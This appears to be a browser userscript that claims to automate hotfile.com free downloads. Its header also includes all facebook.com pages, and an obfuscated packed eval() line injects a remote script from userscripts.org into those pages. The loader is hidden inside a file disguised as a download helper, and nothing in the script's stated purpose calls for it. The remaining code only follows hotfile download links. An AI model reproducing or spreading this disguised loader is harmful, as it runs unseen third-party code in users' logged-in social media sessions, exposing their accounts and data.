// ==UserScript==
// @name           Hotfile Download Automation Pro + Last Update
// @include       http*://*.facebook.com/*
// @description    Automates the hotfile.com free download process.
// @namespace      hotfile.com
// @author         m0nkee
// @include        http://www.hotfile.com/dl/*
// @include        http://hotfile.com/dl/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


/* PLEASE READ:
When one types javascript:document.forms[1].submit(); into their address bar, it will skip the initial 30 second wait, but since it posts to the exact same page in order to display the download link, any method I tried to distinguish the two pages from each other failed.  Otherwise, the skipping of the 30 second wait would also be automated, but if inserted will induce an infinate loop submitting the form over and over again.

Ideas and suggestions welcome, but for now, please just enter the above line in your address bar manually to skip the wait, then the download will start for you.
*/

var i = 0;
for (var link in document.links) {
	var v = document.links[i].href;
	var re = /hotfile.com\/get\//;
	var result = v.search(re);
	if (result != -1) {
		document.location = document.links[i].href;
		break;
	}
	i++;
}